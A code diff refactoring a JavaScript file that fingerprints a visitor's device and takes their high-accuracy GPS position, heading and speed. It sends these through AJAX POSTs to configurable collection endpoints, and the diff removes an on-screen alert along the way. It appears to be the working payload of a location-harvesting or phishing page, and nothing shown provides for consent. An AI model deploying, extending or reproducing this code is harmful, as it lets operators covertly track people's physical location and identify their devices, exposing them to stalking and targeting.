@@ -12,17 +12,10 @@ function information() {
   var ven;
   var ren;
 
+  if (cc == undefined) cc = 'Not Available';
+  if (ram == undefined) ram = 'Not Available';
 
-  if (cc == undefined) {
-    cc = 'Not Available';
-  }
-
-  //ram
-  if (ram == undefined) {
-    ram = 'Not Available';
-  }
-
-  //browser
+  //browser detection
   if (ver.indexOf('Firefox') != -1) {
     str = str.substring(str.indexOf(' Firefox/') + 1);
     str = str.split(' ');
@@ -47,35 +40,27 @@ function information() {
     brw = 'Not Available'
   }
 
-  //gpu
   try {
     gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  }
-  catch (e) { }
+  } catch (e) { }
   if (gl) {
     debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
     ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
     ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
   }
-  if (ven == undefined) {
-    ven = 'Not Available';
-  }
-  if (ren == undefined) {
-    ren = 'Not Available';
-  }
+  if (ven == undefined) ven = 'Not Available';
+  if (ren == undefined) ren = 'Not Available';
 
   var ht = window.screen.height
   var wd = window.screen.width
-  //os
+  
   os = os.substring(0, os.indexOf(')'));
   os = os.split(';');
   os = os[1];
-  if (os == undefined) {
-    os = 'Not Available';
-  }
+  if (os == undefined) os = 'Not Available';
   os = os.trim();
-  
-  // --- UPDATED SECTION 1: Uses info_file variable ---
+
+  // Send Device Info
   $.ajax({
     type: 'POST',
     url: info_file,
@@ -89,6 +74,9 @@ function locate(callback, errCallback) {
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
     navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+  } else {
+    // Optional: You can alert the user if their browser lacks GPS support entirely
+    // alert('Geolocation is not supported by your browser');
   }
 
   function showError(error) {
@@ -104,14 +92,12 @@ function locate(callback, errCallback) {
         break;
       case error.TIMEOUT:
         err_text = 'The request to get user location timed out';
-        alert('Please set your location mode on high accuracy...');
         break;
       case error.UNKNOWN_ERROR:
         err_text = 'An unknown error occurred';
         break;
     }
 
-    // --- UPDATED SECTION 2: Uses error_file variable ---
     $.ajax({
       type: 'POST',
       url: error_file,
@@ -120,53 +106,26 @@ function locate(callback, errCallback) {
       mimeType: 'text'
     });
   }
+
   function showPosition(position) {
-    var lat = position.coords.latitude;
-    if (lat) {
-      lat = lat + ' deg';
-    }
-    else {
-      lat = 'Not Available';
-    }
-    var lon = position.coords.longitude;
-    if (lon) {
-      lon = lon + ' deg';
-    }
-    else {
-      lon = 'Not Available';
-    }
-    var acc = position.coords.accuracy;
-    if (acc) {
-      acc = acc + ' m';
-    }
-    else {
-      acc = 'Not Available';
-    }
-    var alt = position.coords.altitude;
-    if (alt) {
-      alt = alt + ' m';
-    }
-    else {
-      alt = 'Not Available';
-    }
-    var dir = position.coords.heading;
-    if (dir) {
-      dir = dir + ' deg';
-    }
-    else {
-      dir = 'Not Available';
-    }
-    var spd = position.coords.speed;
-    if (spd) {
-      spd = spd + ' m/s';
-    }
-    else {
-      spd = 'Not Available';
-    }
+    // Lat/Lon
+    var lat = position.coords.latitude ? position.coords.latitude + ' deg' : 'Not Available';
+    var lon = position.coords.longitude ? position.coords.longitude + ' deg' : 'Not Available';
+    
+    // Accuracy
+    var acc = position.coords.accuracy ? position.coords.accuracy + ' m' : 'Not Available';
+    
+    // Altitude (Commonly null if indoors/no GPS lock)
+    var alt = position.coords.altitude ? position.coords.altitude + ' m' : 'Sea Level / Unavailable';
+    
+    // Direction (Heading) - Null if stationary
+    var dir = position.coords.heading ? position.coords.heading + ' deg' : 'None (Stationary)';
+    
+    // Speed - Null if stationary
+    var spd = position.coords.speed ? position.coords.speed + ' m/s' : '0 m/s (Stationary)';
 
     var ok_status = 'success';
 
-    // --- UPDATED SECTION 3: Uses result_file variable ---
     $.ajax({
       type: 'POST',
       url: result_file,
